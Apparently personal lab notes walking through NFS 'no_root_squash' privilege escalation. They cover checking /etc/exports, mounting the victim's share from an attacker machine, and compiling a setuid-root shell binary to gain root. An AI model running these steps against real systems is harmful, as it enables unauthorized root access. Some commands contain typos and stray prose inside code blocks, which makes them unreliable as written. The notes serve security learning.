## Detection

**Linux VM**

1. Check the NFS exports:
   ```bash
   cat /etc/exports
   ```

2. Note if `no_root_squash` is defined for the `/tmp` export.
![[Pasted image 20240918112445.png]]
## Exploitation

**Attacker VM**

1. List the machine's exports:
   ```bash
   showmount -e MACHINE_IP
   ```

![[Pasted image 20240918112614.png]]

2. Create a mount point:
   ```bash
   on kali mkdir /tmp/1
   ```

3. Mount the NFS export in to the attacker machine:
   ```bash
   in our kali
   sudo mount -o rw,vers=2 Victim_IP:/tmp /tmp/1

   ```
![[Pasted image 20240918113856.png]]

Version 2 is not set,  we see V3 is. Lets mount vers=3 to our /tmp/1/

![[Pasted image 20240918113906.png]]

4. Create a C file to escalate privileges:
   ```c
   echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
   ```


5. Compile the C file:
   ```bash
   gcc /tmp/1/x.c -o /tmp/1/x
   ```


![[Pasted image 20240918114224.png]]

didnt work, Due to the version of gcc on the vulnerable machine, we have to compile it there


4. Create a C file to escalate privileges:
   ```c
   echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/x.c

ls
   ```


5. Compile the C file:
   ```bash
   gcc /tmp/x.c -o /tmp/x

ls -la
   ```


![[Pasted image 20240918115236.png]]
Notice the user owns the x file

Back on our Kali machine, we need to make sure root owns the X file, and we need to set the SUID bit

6. Set the SUID bit on the binary:
   ```bash
On our Kali
sudo chownn root:root /tmp/1/x
chmod +s /tmp/1/x
   ```


**Linux Victim VM**

1. On victim check permissions of x file in mounted folder
![[Pasted image 20240918115805.png]]


2. Run the binary:
   ```bash
   /tmp/x
   ```
3. Check your user ID:
   ```bash
   id
   ```



Explanation

NFS (Network File System) allows a Linux/Unix system to share directories and files with other systems over a network. When dealing with NFS exports, "root squashing" is a security feature that prevents users on NFS clients (remote systems) from having root-level privileges on files and directories shared by the NFS server


**Root squashing disabled**: When the "no_root_squash" option is used in `/etc/exports`, root users on NFS clients retain their root privileges on the shared NFS directory.

